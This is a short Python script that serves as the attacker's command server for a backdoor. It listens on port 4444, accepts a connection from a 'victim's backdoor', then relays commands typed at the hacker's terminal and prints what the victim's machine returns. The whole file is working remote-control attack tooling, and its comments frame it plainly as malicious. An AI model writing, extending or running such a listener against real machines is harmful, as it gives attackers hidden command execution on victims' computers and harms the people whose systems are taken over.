import socket

#specify host ip and port
my_ip = '192.168.1.56'
port = 4444

#creates host server
server = socket.socket()
server.bind((my_ip, port))

#listen on server for fresh connections 
#(from victim's backdoor)
print('Server Online')
print('Waiting For Connection')
server.listen(1)
victim, victim_addr = server.accept()
print(f'{victim_addr} opened a backdoor')

#script to send commands and recieve output
while True:
    #takes in and sends commands from hackers terminal
    command = input('Send Malicious Command: ')
    command = command.encode()
    victim.send(command)
    print('Sent!')
    #receives resulting output from victim's machine
    output = victim.recv(1024)
    output = output.decode()
    print(f"Command Output: {output}")
    